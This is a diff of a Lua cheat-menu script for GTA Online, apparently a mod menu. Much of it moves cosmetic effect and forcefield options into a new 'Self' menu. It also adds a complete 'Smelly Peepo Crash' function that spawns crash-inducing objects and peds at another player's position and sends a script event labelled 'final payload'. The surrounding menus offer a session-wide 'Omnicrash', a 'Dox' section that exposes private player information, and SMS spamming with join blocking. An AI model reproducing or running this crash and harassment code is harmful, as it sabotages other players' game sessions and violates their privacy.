@@ -1,4 +1,4 @@
-VERSION = "0.6.1"
+VERSION = "0.6.2"
 MANIFEST = {
     lib = {"Audio.lua", "Entity.lua", "Globals.lua", "Player.lua", "PTFX.lua", "Vector.lua", "Vehicle.lua"},
     resources = {"Crosshair.png"}
@@ -266,6 +266,66 @@ function do_omnicrash(player_id)
     end
 end
 
+function do_smelly_peepo_crash(player_id)
+    local player_ped = player_get_ped(player_id)
+    local player_ped_heading = ENTITY.GET_ENTITY_HEADING(player_ped)
+    local player_coords = ENTITY.GET_ENTITY_COORDS(player_ped)
+
+    util.toast("Spawning smelly objects on " .. PLAYER.GET_PLAYER_NAME(player_id) .. "...")
+    show_text_message(Colors.Purple, "Smelly Peepo Crash", "Smelly Peepo Crash has begun. This may take a while...")
+
+    request_model(-930879665)
+    request_model(3613262246)
+    request_model(452618762)
+    local object_1 = entities.create_object(-930879665, player_coords)
+    util.yield(10)
+    local object_2 = entities.create_object(3613262246, player_coords)
+    util.yield(10)
+    local object_3 = entities.create_object(452618762, player_coords)
+    util.yield(10)
+    local object_4 = entities.create_object(3613262246, player_coords)
+    util.yield(300)
+    entities.delete_by_handle(object_1)
+    entities.delete_by_handle(object_2)
+    entities.delete_by_handle(object_3)
+    entities.delete_by_handle(object_4)
+
+    util.toast("Spawning smelly peds on " .. PLAYER.GET_PLAYER_NAME(player_id) .. "...")
+    local ped = entities.create_ped(0, 1057201338, player_coords, 0)
+    util.yield(100)
+    entities.delete_by_handle(ped)
+    local ped = entities.create_ped(0, -2056455422, player_coords, 0)
+    util.yield(100)
+    entities.delete_by_handle(ped)
+    local ped = entities.create_ped(0, 762327283, player_coords, 0)
+    util.yield(100)
+    entities.delete_by_handle(ped)
+
+    util.toast("Spawning the smelliest of peds on " .. PLAYER.GET_PLAYER_NAME(player_id) .. "!")
+    local fatcult = util.joaat("a_f_m_fatcult_01"); request_model(fatcult)
+    for i = 1, 8 do
+        util.create_thread(function()
+            local ped = entities.create_ped(
+                0, fatcult,
+                vector_add(player_coords, {x = math.random(-1, 1), y = math.random(-1, 1), z = 0}),
+                player_ped_heading
+            )
+            util.yield(400)
+            entities.delete_by_handle(ped)
+        end)
+        util.yield(100)
+        local ped_1 = entities.create_ped(0, util.joaat("slod_human"), player_coords, player_ped_heading)
+        local ped_2 = entities.create_ped(0, util.joaat("slod_large_quadped"), player_coords, player_ped_heading)
+        local ped_3 = entities.create_ped(0, util.joaat("slod_small_quadped"), player_coords, player_ped_heading)
+        util.yield(750)
+        entities.delete_by_handle(ped_1)
+        entities.delete_by_handle(ped_2)
+        entities.delete_by_handle(ped_3)
+        player_send_script_event(player_id, {962740265, player_id, 23243, 5332, 3324, player_id}, "final payload")
+    end
+    util.toast("Done!")
+end
+
 
 -- Session Functions --
 function watch_and_takeover_vehicle_all(action, modders, wait_for)
@@ -372,6 +432,7 @@ end
 
 
 -- Main Menu --
+self_root = menu.list(menu.my_root(), "Self", {"ryanself"}, "Helpful options for yourself.")
 world_root = menu.list(menu.my_root(), "World", {"ryanworld"}, "Helpful options for entities in the world.")
 session_root = menu.list(menu.my_root(), "Session", {"ryansession"}, "Trolling options for the entire session.")
 stats_root = menu.list(menu.my_root(), "Stats", {"ryanstats"}, "Common stats you may want to edit.")
@@ -379,13 +440,238 @@ chat_root = menu.list(menu.my_root(), "Chat", {"ryanchat"}, "Send special chat m
 settings_root = menu.list(menu.my_root(), "Settings", {"ryansettings"}, "Settings for Ryan's Menu.")
 
 
+-- Self Menu --
+self_ptfx_root = menu.list(self_root, "PTFX...", {"ryanptfx"}, "Special FX options.")
+self_forcefield_root = menu.list(self_root, "Forcefield...", {"ryanforcefield"}, "An enhanced WiriScript forcefield.")
+
+-- -- PTFX
+ptfx_color = {r = 1.0, g = 1.0, b = 1.0}
+
+self_ptfx_body_root = menu.list(self_ptfx_root, "Body...", {"ryanptfxbody"}, "Special FX on your body other players can see.")
+self_ptfx_weapon_root = menu.list(self_ptfx_root, "Weapon...", {"ryanptfxweapon"}, "Special FX on your weapon other players can see.")
+self_ptfx_vehicle_root = menu.list(self_ptfx_root, "Vehicle...", {"ryanptfxvehicle"}, "Special FX on your vehicle other players can see.")
+self_ptfx_pointing_root = menu.list(self_ptfx_root, "Pointing...", {"ryanptfxpointing"}, "Special FX when pointing other players can see.")
+
+menu.divider(self_ptfx_root, "Options")
+menu.colour(self_ptfx_root, "Color", {"ryanptfxcolor"}, "Some PTFX options allow for custom colors.", 1.0, 1.0, 1.0, 1.0, false, function(color)
+    ptfx_color.r = color.r
+    ptfx_color.g = color.g
+    ptfx_color.b = color.b
+end)
+
+-- -- Body PTFX
+self_ptfx_body_head_root = menu.list(self_ptfx_body_root, "Head...", {"ryanptfxhead"}, "Special FX on your head.")
+self_ptfx_body_hands_root = menu.list(self_ptfx_body_root, "Hands...", {"ryanptfxhands"}, "Special FX on your hands.")
+self_ptfx_body_feet_root = menu.list(self_ptfx_body_root, "Feet...", {"ryanptfxfeet"}, "Special FX on your feet.")
+
+ptfx_create_list(self_ptfx_body_head_root, function(ptfx)
+    ptfx_play_on_entity_bones(player_get_ped(), PlayerBones.Head, ptfx[1], ptfx[2], ptfx_color)
+    util.yield(ptfx[3])
+end)
+
+ptfx_create_list(self_ptfx_body_hands_root, function(ptfx)
+    ptfx_play_on_entity_bones(player_get_ped(), PlayerBones.Hands, ptfx[1], ptfx[2], ptfx_color)
+    util.yield(ptfx[3])
+end)
+
+ptfx_create_list(self_ptfx_body_feet_root, function(ptfx)
+    ptfx_play_on_entity_bones(player_get_ped(), PlayerBones.Feet, ptfx[1], ptfx[2], ptfx_color)
+    util.yield(ptfx[3])
+end)
+
+-- -- Vehicle PTFX
+self_ptfx_vehicle_wheels_root = menu.list(self_ptfx_vehicle_root, "Wheels...", {"ryanptfxwheels"}, "Special FX on the wheels of your vehicle.")
+self_ptfx_vehicle_exhaust_root = menu.list(self_ptfx_vehicle_root, "Exhaust...", {"ryanptfxexhaust"}, "Speicla FX on the exhaust of your vehicle.")
+
+ptfx_create_list(self_ptfx_vehicle_wheels_root, function(ptfx)
+    local vehicle = PED.GET_VEHICLE_PED_IS_IN(player_get_ped(), true)
+    if vehicle ~= NULL then
+        ptfx_play_on_entity_bones(vehicle, VehicleBones.Wheels, ptfx[1], ptfx[2], ptfx_color)
+        util.yield(ptfx[3])
+    end
+end)
+
+ptfx_create_list(self_ptfx_vehicle_exhaust_root, function(ptfx)
+    local vehicle = PED.GET_VEHICLE_PED_IS_IN(player_get_ped(), true)
+    if vehicle ~= NULL then
+        ptfx_play_on_entity_bones(vehicle, VehicleBones.Exhaust, ptfx[1], ptfx[2], ptfx_color)
+        util.yield(ptfx[3])
+    end
+end)
+
+-- -- Weapon PTFX
+self_ptfx_weapon_aiming_root = menu.list(self_ptfx_weapon_root, "Aiming...", {"ryanptfxaiming"}, "Special FX when aiming at a spot.")
+self_ptfx_weapon_muzzle_root = menu.list(self_ptfx_weapon_root, "Muzzle...", {"ryanptfxmuzzle"}, "Special FX on the end of your weapon's barrel.")
+self_ptfx_weapon_muzzle_flash_root = menu.list(self_ptfx_weapon_root, "Muzzle Flash...", {"ryanptfxmuzzleflash"}, "Special FX on the end of your weapon's barrel when firing.")
+self_ptfx_weapon_impact_root = menu.list(self_ptfx_weapon_root, "Impact...", {"ryanptfximpact"}, "Special FX at the impact of your bullets.")
+
+ptfx_create_list(self_ptfx_weapon_aiming_root, function(ptfx)
+    if CAM.IS_AIM_CAM_ACTIVE() then
+        local raycast = do_raycast(1000.0)
+        if raycast.did_hit then
+            ptfx_play_at_coords(raycast.hit_coords, ptfx[1], ptfx[2], ptfx_color)
+            util.yield(ptfx[3])
+        end
+    end
+end)
+
+ptfx_create_list(self_ptfx_weapon_muzzle_root, function(ptfx)
+    local weapon = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(player_get_ped())
+    if weapon ~= NULL then
+        ptfx_play_at_entity_bone_coords(weapon, WeaponBones.Muzzle, ptfx[1], ptfx[2], ptfx_color)
+        util.yield(ptfx[3])
+    end
+end)
+
+ptfx_create_list(self_ptfx_weapon_muzzle_flash_root, function(ptfx)
+    local player_ped = player_get_ped()
+    if PED.IS_PED_SHOOTING(player_ped) then
+        local weapon = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(player_ped)
+        if weapon ~= NULL then
+            ptfx_play_at_entity_bone_coords(weapon, WeaponBones.Muzzle, ptfx[1], ptfx[2], ptfx_color)
+            util.yield(ptfx[3])
+        end
+    end
+end)
+
+ptfx_create_list(self_ptfx_weapon_impact_root, function(ptfx)
+    local impact_ptr = memory.alloc()
+    if WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(player_get_ped(), impact_ptr) then
+        ptfx_play_at_coords(memory.read_vector3(impact_ptr), ptfx[1], ptfx[2], ptfx_color)
+        memory.free(impact_ptr)
+    end
+end)
+
+-- -- Pointing PTFX
+self_ptfx_pointing_finger_root = menu.list(self_ptfx_pointing_root, "Finger...", {"ryanptfxpointingfinger"}, "Special FX on your left finger.")
+self_ptfx_pointing_crosshair_root = menu.list(self_ptfx_pointing_root, "Crosshair...", {"ryanptfxpointingfinger"}, "Special FX on your crosshair.")
+
+ptfx_create_list(self_ptfx_pointing_finger_root, function(ptfx)
+    if memory.read_int(memory.script_global(4516656 + 930)) == 3 then
+        ptfx_play_on_entity_bones(player_get_ped(), PlayerBones.Pointer, ptfx[1], ptfx[2], ptfx_color)
+        util.yield(ptfx[3])
+    end
+end)
+
+ptfx_create_list(self_ptfx_pointing_crosshair_root, function(ptfx)
+    if player_is_pointing then
+        local raycast = do_raycast(1000.0)
+        if raycast.did_hit then
+            ptfx_play_at_coords(raycast.hit_coords, ptfx[1], ptfx[2], ptfx_color)
+            util.yield(ptfx[3])
+        end
+    end
+end)
+
+-- -- Forcefield
+forcefield_mode = ForcefieldModes.None
+forcefield_size = 10
+forcefield_force = 1
+
+self_forcefield_mode_root = menu.list(self_forcefield_root, "Mode: None", {"ryanforcefieldmode"}, "Forcefield mode.")
+for mode_name, mode_id in pairs(ForcefieldModes) do
+    menu.action(self_forcefield_mode_root, mode_name, {"ryanforcefield" .. mode_name:lower()}, "", function()
+        forcefield_mode = mode_id
+        menu.set_menu_name(self_forcefield_mode_root, "Mode: " .. mode_name)
+        menu.focus(self_forcefield_mode_root)
+    end)
+end
+
+menu.divider(self_forcefield_root, "Options")
+menu.slider(self_forcefield_root, "Size", {"ryanforcefieldsize"}, "Diameter of the forcefield sphere.", 10, 250, 10, 10, function(value)
+    forcefield_size = value
+end)
+menu.slider(self_forcefield_root, "Force", {"ryanforcefieldforce"}, "Force applied by the forcefield.", 1, 100, 1, 1, function(value)
+    forcefield_force = value
+end)
+
+entities_destroyed = {}
+util.create_tick_handler(function()
+    if forcefield_mode == ForcefieldModes.Push then -- Push
+        local player_ped = player_get_ped()
+        local player_coords = ENTITY.GET_ENTITY_COORDS(player_ped)
+		local entities = entity_get_all_nearby(player_coords, forcefield_size)
+		for _, entity in pairs(entities) do
+			local entity_coords = ENTITY.GET_ENTITY_COORDS(entity)
+			local force = vector_normalize(vector_subtract(entity_coords, player_coords))
+            force = vector_multiply(force, forcefield_force)
+			if ENTITY.IS_ENTITY_A_PED(entity)  then
+				if not PED.IS_PED_A_PLAYER(entity) and not PED.IS_PED_IN_ANY_VEHICLE(entity, true) then
+					entity_request_control(entity)
+					PED.SET_PED_TO_RAGDOLL(entity, 1000, 1000, 0, 0, 0, 0)
+					ENTITY.APPLY_FORCE_TO_ENTITY(entity, 1, force.x, force.y, force.z, 0, 0, 0.5, 0, false, false, true)
+				end
+			else
+				entity_request_control(entity)
+				ENTITY.APPLY_FORCE_TO_ENTITY(entity, 1, force.x, force.y, force.z, 0, 0, 0.5, 0, false, false, true)
+			end
+		end
+        entities_destroyed = {}
+    elseif forcefield_mode == ForcefieldModes.Destroy then -- Destroy
+        local player_ped = player_get_ped()
+        local player_coords = ENTITY.GET_ENTITY_COORDS(player_ped)
+        local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(player_ped)
+
+        local entities = entity_get_all_nearby(player_coords, 200, NearbyEntitiesModes.All)
+        for _, entity in pairs(entities) do
+            local was_destroyed = false
+            for _, destroyed_entity in pairs(entities_destroyed) do
+                if destroyed_entity == entity then was_destroyed = true end
+            end
+
+            if not was_destroyed then
+                if entity ~= player_ped and entity ~= player_vehicle then
+                    local coords = ENTITY.GET_ENTITY_COORDS(entity)
+                    FIRE.ADD_EXPLOSION(
+                        coords.x, coords.y, coords.z,
+                        29, 5.0, false, true, 0.0
+                    )
+                end
+                table.insert(entities_destroyed, entity)
+            end
+        end
+    else
+        entities_destroyed = {}
+    end
+    return true
+end)
+
+-- -- Crosshair When Pointing
+world_crosshair_when_pointing = false
+player_is_pointing = false
+
+menu.toggle(self_root, "Crosshair When Pointing", {"ryanpointingcrosshair"}, "Adds a crosshair when pointing.", function(value)
+    world_crosshair_when_pointing = value
+end)
+
+-- -- All Players Visible
+menu.toggle_loop(self_root, "All Players Visible", {"ryannoinvisible"}, "Makes all invisible players visible again.", function()
+    for _, player_id in pairs(players.list()) do
+        ENTITY.SET_ENTITY_VISIBLE(player_get_ped(player_id), true, 0)
+    end
+end, false)
+
+-- -- E-Brake
+ebrake = false
+menu.toggle(self_root, "E-Brake", {"ryanebrake"}, "Makes your car drift while holding Shift.", function(value)
+    ebrake = value
+end)
+util.create_tick_handler(function()
+    if ebrake then
+        local vehicle = PED.GET_VEHICLE_PED_IS_IN(player_get_ped())
+        if ENTITY.IS_ENTITY_A_VEHICLE(vehicle) then
+            vehicle_set_no_grip(vehicle, PAD.IS_CONTROL_PRESSED(21, 21))
+        end
+    end
+    util.yield()
+end)
+
+
 -- World Menu --
 world_closest_vehicle_root = menu.list(world_root, "Closest Vehicle...", {"ryanclosestvehicle"}, "Useful options for nearby vehicles.")
+world_collectibles_root = menu.list(world_root, "Collectibles...", {"ryancollectibles"}, "Useful presets to teleport to.")
 world_vehicles_root = menu.list(world_root, "All Vehicles...", {"ryanallvehicles"}, "Control the vehicles around you.")
 world_npc_action_root = menu.list(world_root, "All NPCs: None", {"ryannpcaction"}, "Changes the action NPCs are currently performing.")
-world_collectibles_root = menu.list(world_root, "Collectibles...", {"ryancollectibles"}, "Useful presets to teleport to.")
-world_forcefield_root = menu.list(world_root, "Forcefield...", {"ryanforcefield"}, "An enhanced WiriScript forcefield.")
-world_ptfx_root = menu.list(world_root, "PTFX...", {"ryanptfx"}, "Special FX options.")
 
 
 -- -- Enter Closest Vehicle
@@ -601,199 +887,6 @@ for i = 1, #PlayingCards do
     end)
 end
 
-
--- -- Forcefield
-forcefield_mode = ForcefieldModes.None
-forcefield_size = 10
-forcefield_force = 1
-
-self_forcefield_mode_root = menu.list(world_forcefield_root, "Mode: None", {"ryanforcefieldmode"}, "Forcefield mode.")
-for mode_name, mode_id in pairs(ForcefieldModes) do
-    menu.action(self_forcefield_mode_root, mode_name, {"ryanforcefield" .. mode_name:lower()}, "", function()
-        forcefield_mode = mode_id
-        menu.set_menu_name(self_forcefield_mode_root, "Mode: " .. mode_name)
-        menu.focus(self_forcefield_mode_root)
-    end)
-end
-
-menu.divider(world_forcefield_root, "Options")
-menu.slider(world_forcefield_root, "Size", {"ryanforcefieldsize"}, "Diameter of the forcefield sphere.", 10, 250, 10, 10, function(value)
-    forcefield_size = value
-end)
-menu.slider(world_forcefield_root, "Force", {"ryanforcefieldforce"}, "Force applied by the forcefield.", 1, 100, 1, 1, function(value)
-    forcefield_force = value
-end)
-
-entities_destroyed = {}
-util.create_tick_handler(function()
-    if forcefield_mode == ForcefieldModes.Push then -- Push
-        local player_ped = player_get_ped()
-        local player_coords = ENTITY.GET_ENTITY_COORDS(player_ped)
-		local entities = entity_get_all_nearby(player_coords, forcefield_size)
-		for _, entity in pairs(entities) do
-			local entity_coords = ENTITY.GET_ENTITY_COORDS(entity)
-			local force = vector_normalize(vector_subtract(entity_coords, player_coords))
-            force = vector_multiply(force, forcefield_force)
-			if ENTITY.IS_ENTITY_A_PED(entity)  then
-				if not PED.IS_PED_A_PLAYER(entity) and not PED.IS_PED_IN_ANY_VEHICLE(entity, true) then
-					entity_request_control(entity)
-					PED.SET_PED_TO_RAGDOLL(entity, 1000, 1000, 0, 0, 0, 0)
-					ENTITY.APPLY_FORCE_TO_ENTITY(entity, 1, force.x, force.y, force.z, 0, 0, 0.5, 0, false, false, true)
-				end
-			else
-				entity_request_control(entity)
-				ENTITY.APPLY_FORCE_TO_ENTITY(entity, 1, force.x, force.y, force.z, 0, 0, 0.5, 0, false, false, true)
-			end
-		end
-        entities_destroyed = {}
-    elseif forcefield_mode == ForcefieldModes.Destroy then -- Destroy
-        local player_ped = player_get_ped()
-        local player_coords = ENTITY.GET_ENTITY_COORDS(player_ped)
-        local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(player_ped)
-
-        local entities = entity_get_all_nearby(player_coords, 200, NearbyEntitiesModes.All)
-        for _, entity in pairs(entities) do
-            local was_destroyed = false
-            for _, destroyed_entity in pairs(entities_destroyed) do
-                if destroyed_entity == entity then was_destroyed = true end
-            end
-
-            if not was_destroyed then
-                if entity ~= player_ped and entity ~= player_vehicle then
-                    local coords = ENTITY.GET_ENTITY_COORDS(entity)
-                    FIRE.ADD_EXPLOSION(
-                        coords.x, coords.y, coords.z,
-                        29, 5.0, false, true, 0.0
-                    )
-                end
-                table.insert(entities_destroyed, entity)
-            end
-        end
-    else
-        entities_destroyed = {}
-    end
-    return true
-end)
-
--- -- PTFX
-ptfx_color = {r = 1.0, g = 1.0, b = 1.0}
-
-world_ptfx_body_root = menu.list(world_ptfx_root, "Body...", {"ryanptfxbody"}, "Special FX on your body other players can see.")
-world_ptfx_weapon_root = menu.list(world_ptfx_root, "Weapon...", {"ryanptfxweapon"}, "Special FX on your weapon other players can see.")
-world_ptfx_vehicle_root = menu.list(world_ptfx_root, "Vehicle...", {"ryanptfxvehicle"}, "Special FX on your vehicle other players can see.")
-world_ptfx_pointing_root = menu.list(world_ptfx_root, "Pointing...", {"ryanptfxpointing"}, "Special FX when pointing other players can see.")
-
-menu.divider(world_ptfx_root, "Options")
-menu.colour(world_ptfx_root, "Color", {"ryanptfxcolor"}, "Some PTFX options allow for custom colors.", 1.0, 1.0, 1.0, 1.0, false, function(color)
-    ptfx_color.r = color.r
-    ptfx_color.g = color.g
-    ptfx_color.b = color.b
-end)
-
--- -- Body PTFX
-self_ptfx_body_head_root = menu.list(world_ptfx_body_root, "Head...", {"ryanptfxhead"}, "Special FX on your head.")
-self_ptfx_body_hands_root = menu.list(world_ptfx_body_root, "Hands...", {"ryanptfxhands"}, "Special FX on your hands.")
-self_ptfx_body_feet_root = menu.list(world_ptfx_body_root, "Feet...", {"ryanptfxfeet"}, "Special FX on your feet.")
-
-ptfx_create_list(self_ptfx_body_head_root, function(ptfx)
-    ptfx_play_on_entity_bones(player_get_ped(), PlayerBones.Head, ptfx[1], ptfx[2], ptfx_color)
-    util.yield(ptfx[3])
-end)
-
-ptfx_create_list(self_ptfx_body_hands_root, function(ptfx)
-    ptfx_play_on_entity_bones(player_get_ped(), PlayerBones.Hands, ptfx[1], ptfx[2], ptfx_color)
-    util.yield(ptfx[3])
-end)
-
-ptfx_create_list(self_ptfx_body_feet_root, function(ptfx)
-    ptfx_play_on_entity_bones(player_get_ped(), PlayerBones.Feet, ptfx[1], ptfx[2], ptfx_color)
-    util.yield(ptfx[3])
-end)
-
--- -- Vehicle PTFX
-self_ptfx_vehicle_wheels_root = menu.list(world_ptfx_vehicle_root, "Wheels...", {"ryanptfxwheels"}, "Special FX on the wheels of your vehicle.")
-self_ptfx_vehicle_exhaust_root = menu.list(world_ptfx_vehicle_root, "Exhaust...", {"ryanptfxexhaust"}, "Speicla FX on the exhaust of your vehicle.")
-
-ptfx_create_list(self_ptfx_vehicle_wheels_root, function(ptfx)
-    local vehicle = PED.GET_VEHICLE_PED_IS_IN(player_get_ped(), true)
-    if vehicle ~= NULL then
-        ptfx_play_on_entity_bones(vehicle, VehicleBones.Wheels, ptfx[1], ptfx[2], ptfx_color)
-        util.yield(ptfx[3])
-    end
-end)
-
-ptfx_create_list(self_ptfx_vehicle_exhaust_root, function(ptfx)
-    local vehicle = PED.GET_VEHICLE_PED_IS_IN(player_get_ped(), true)
-    if vehicle ~= NULL then
-        ptfx_play_on_entity_bones(vehicle, VehicleBones.Exhaust, ptfx[1], ptfx[2], ptfx_color)
-        util.yield(ptfx[3])
-    end
-end)
-
--- -- Weapon PTFX
-self_ptfx_weapon_aiming_root = menu.list(world_ptfx_weapon_root, "Aiming...", {"ryanptfxaiming"}, "Special FX when aiming at a spot.")
-self_ptfx_weapon_muzzle_root = menu.list(world_ptfx_weapon_root, "Muzzle...", {"ryanptfxmuzzle"}, "Special FX on the end of your weapon's barrel.")
-self_ptfx_weapon_muzzle_flash_root = menu.list(world_ptfx_weapon_root, "Muzzle Flash...", {"ryanptfxmuzzleflash"}, "Special FX on the end of your weapon's barrel when firing.")
-self_ptfx_weapon_impact_root = menu.list(world_ptfx_weapon_root, "Impact...", {"ryanptfximpact"}, "Special FX at the impact of your bullets.")
-
-ptfx_create_list(self_ptfx_weapon_aiming_root, function(ptfx)
-    if CAM.IS_AIM_CAM_ACTIVE() then
-        local raycast = do_raycast(1000.0)
-        if raycast.did_hit then
-            ptfx_play_at_coords(raycast.hit_coords, ptfx[1], ptfx[2], ptfx_color)
-            util.yield(ptfx[3])
-        end
-    end
-end)
-
-ptfx_create_list(self_ptfx_weapon_muzzle_root, function(ptfx)
-    local weapon = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(player_get_ped())
-    if weapon ~= NULL then
-        ptfx_play_at_entity_bone_coords(weapon, WeaponBones.Muzzle, ptfx[1], ptfx[2], ptfx_color)
-        util.yield(ptfx[3])
-    end
-end)
-
-ptfx_create_list(self_ptfx_weapon_muzzle_flash_root, function(ptfx)
-    local player_ped = player_get_ped()
-    if PED.IS_PED_SHOOTING(player_ped) then
-        local weapon = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(player_ped)
-        if weapon ~= NULL then
-            ptfx_play_at_entity_bone_coords(weapon, WeaponBones.Muzzle, ptfx[1], ptfx[2], ptfx_color)
-            util.yield(ptfx[3])
-        end
-    end
-end)
-
-ptfx_create_list(self_ptfx_weapon_impact_root, function(ptfx)
-    local impact_ptr = memory.alloc()
-    if WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(player_get_ped(), impact_ptr) then
-        ptfx_play_at_coords(memory.read_vector3(impact_ptr), ptfx[1], ptfx[2], ptfx_color)
-        memory.free(impact_ptr)
-    end
-end)
-
--- -- Pointing PTFX
-self_ptfx_pointing_finger_root = menu.list(world_ptfx_pointing_root, "Finger...", {"ryanptfxpointingfinger"}, "Special FX on your left finger.")
-self_ptfx_pointing_crosshair_root = menu.list(world_ptfx_pointing_root, "Crosshair...", {"ryanptfxpointingfinger"}, "Special FX on your crosshair.")
-
-ptfx_create_list(self_ptfx_pointing_finger_root, function(ptfx)
-    if memory.read_int(memory.script_global(4516656 + 930)) == 3 then
-        ptfx_play_on_entity_bones(player_get_ped(), PlayerBones.Pointer, ptfx[1], ptfx[2], ptfx_color)
-        util.yield(ptfx[3])
-    end
-end)
-
-ptfx_create_list(self_ptfx_pointing_crosshair_root, function(ptfx)
-    if player_is_pointing then
-        local raycast = do_raycast(1000.0)
-        if raycast.did_hit then
-            ptfx_play_at_coords(raycast.hit_coords, ptfx[1], ptfx[2], ptfx_color)
-            util.yield(ptfx[3])
-        end
-    end
-end)
-
 -- -- Tiny People
 world_tiny_people = false
 menu.toggle(world_root, "Tiny People", {"ryantinypeople"}, "Makes everyone tiny (only for you.)", function(value)
@@ -804,14 +897,6 @@ util.create_tick_handler(function()
         PED.SET_PED_CONFIG_FLAG(ped, 223, world_tiny_people)
     end
     util.yield(100)
-end)
-
--- -- Crosshair When Pointing
-world_crosshair_when_pointing = false
-player_is_pointing = false
-
-menu.toggle(world_root, "Crosshair When Pointing", {"ryanpointingcrosshair"}, "Adds a crosshair when pointing.", function(value)
-    world_crosshair_when_pointing = value
 end)
 
 -- -- Del Perro Fireworks
@@ -856,35 +941,7 @@ session_trolling_root = menu.list(session_root, "Trolling...", {"ryantrolling"},
 session_nuke_root = menu.list(session_root, "Nuke...", {"ryannuke"}, "Plays a siren, timer, and bomb with additional earrape.")
 session_dox_root = menu.list(session_root, "Dox...", {"ryandox"}, "Shares information players probably want private.")
 
--- -- Downgrade Vehicle
-menu.action(session_vehicles_root, "Downgrade", {"ryandowngrade"}, "Downgrades every player's car.", function()
-    for _, player_id in pairs(players.list()) do
-        local vehicle = PED.GET_VEHICLE_PED_IS_IN(player_get_ped(player_id), false)
-        if vehicle ~= NULL then
-            entity_request_control_loop(vehicle)
-            if ENTITY.IS_ENTITY_A_VEHICLE(vehicle) then
-                vehicle_set_upgraded(vehicle, false)
-            end
-        end
-        util.toast("Downgraded everyone's car!")
-    end
-end)
-
--- -- Make Vehicle Slow
-menu.action(session_vehicles_root, "Make Slow", {"ryanslow"}, "Slows every player's car.", function()
-    for _, player_id in pairs(players.list()) do
-        local vehicle = PED.GET_VEHICLE_PED_IS_IN(player_get_ped(player_id), false)
-        if vehicle ~= NULL then
-            entity_request_control_loop(vehicle)
-            if ENTITY.IS_ENTITY_A_VEHICLE(vehicle) then
-                vehicle_set_speed(vehicle, false)
-            end
-        end
-        util.toast("Made everyone's car slow!")
-    end
-end)
-
--- -- Make Vehicle Fast
+-- -- Make Fast
 menu.action(session_vehicles_root, "Make Fast", {"ryanfast"}, "Speeds up every player's car.", function()
     for _, player_id in pairs(players.list()) do
         local vehicle = PED.GET_VEHICLE_PED_IS_IN(player_get_ped(player_id), false)
@@ -898,7 +955,21 @@ menu.action(session_vehicles_root, "Make Fast", {"ryanfast"}, "Speeds up every p
     end
 end)
 
--- -- Make Vehicle Drift
+-- -- Make Slow
+menu.action(session_vehicles_root, "Make Slow", {"ryanslow"}, "Slows every player's car.", function()
+    for _, player_id in pairs(players.list()) do
+        local vehicle = PED.GET_VEHICLE_PED_IS_IN(player_get_ped(player_id), false)
+        if vehicle ~= NULL then
+            entity_request_control_loop(vehicle)
+            if ENTITY.IS_ENTITY_A_VEHICLE(vehicle) then
+                vehicle_set_speed(vehicle, false)
+            end
+        end
+        util.toast("Made everyone's car slow!")
+    end
+end)
+
+-- -- Make Drift
 menu.action(session_vehicles_root, "Make Drift", {"ryandrift"}, "Makes every player's car lose grip.", function()
     for _, player_id in pairs(players.list()) do
         local vehicle = PED.GET_VEHICLE_PED_IS_IN(player_get_ped(player_id), false)
@@ -952,6 +1023,20 @@ menu.action(session_vehicles_root, "Catapult", {"ryancatapult"}, "Catapults ever
         end
     end
     util.toast("Catapulted everyone's car!")
+end)
+
+-- -- Downgrade Vehicle
+menu.action(session_vehicles_root, "Downgrade", {"ryandowngrade"}, "Downgrades every player's car.", function()
+    for _, player_id in pairs(players.list()) do
+        local vehicle = PED.GET_VEHICLE_PED_IS_IN(player_get_ped(player_id), false)
+        if vehicle ~= NULL then
+            entity_request_control_loop(vehicle)
+            if ENTITY.IS_ENTITY_A_VEHICLE(vehicle) then
+                vehicle_set_upgraded(vehicle, false)
+            end
+        end
+        util.toast("Downgraded everyone's car!")
+    end
 end)
 
 -- -- Mass Trolling
@@ -1058,7 +1143,7 @@ menu.action(session_dox_root, "Oppressor", {"ryanoppressor"}, "Shares the name o
 end)
 
 -- -- Omnicrash
-session_omnicrash_root = menu.list(session_root, "Omnicrash", {"ryanomnicrashall"}, "The ultimate session crash.")
+session_omnicrash_root = menu.list(session_root, "Omnicrash...", {"ryanomnicrashall"}, "The ultimate session crash.")
 session_omnicrash_friends = false
 session_omnicrash_modders = true
 
@@ -1079,13 +1164,6 @@ end)
 menu.toggle(session_omnicrash_root, "Include Modders", {"ryanomnicrashmodders"}, "If enabled, modders are included in the Omnicrash.", function(value)
     session_omnicrash_modders = value
 end)
-
--- -- All Players Visible
-menu.toggle_loop(session_root, "All Players Visible", {"ryannoinvisible"}, "Makes all invisible players visible again.", function()
-    for _, player_id in pairs(players.list()) do
-        ENTITY.SET_ENTITY_VISIBLE(player_get_ped(player_id), true, 0)
-    end
-end, false)
 
 -- -- Fake Money Drop
 menu.toggle_loop(session_root, "Fake Money Drop", {"ryanfakemoneyall"}, "Drops fake money bags on all players.", function()
@@ -1143,6 +1221,20 @@ end)
 mc_clutter_100 = menu.action(stats_mc_clutter_root, "100% Full", {"ryanmcclutter100"}, "Adds drugs, money, and other clutter to your M.C. clubhouse.", function(click_type)
     set_mc_clutter(mc_clutter_100, click_type, 20000000)
 end)
+
+
+function spam_and_block_then(player_id, removal_block_joins, removal_message, action)
+    local player_name = PLAYER.GET_PLAYER_NAME(player_id)
+    if removal_block_joins then
+        player_block_joins(player_name)
+    end
+    if removal_message ~= "" and removal_message ~= " " then
+        util.toast("Spamming " .. player_name .. " with texts...")
+        do_sms_spam(player_id, removal_message, 6000)
+    end
+    action()
+    menu.trigger_commands("players")
+end
 
 
 -- Player Options --
@@ -1241,7 +1333,6 @@ function setup_player(player_id)
         util.toast("Downgraded " .. PLAYER.GET_PLAYER_NAME(player_id) .. "'s car!")
     end)
 
-
     -- -- No Godmode
     local remove_godmode_notice = 0
     menu.toggle_loop(player_trolling_root, "No Godmode", {"ryannogodmode"}, "Removes godmode from Kiddions users and their vehicles.", function()
@@ -1252,7 +1343,6 @@ function setup_player(player_id)
         end
     end, false)
 
-    
     -- -- Fake Money Drop
     menu.toggle_loop(player_trolling_root, "Fake Money Drop", {"ryanfakemoney"}, "Drops fake money bags on the player.", function()
         util.create_thread(function()
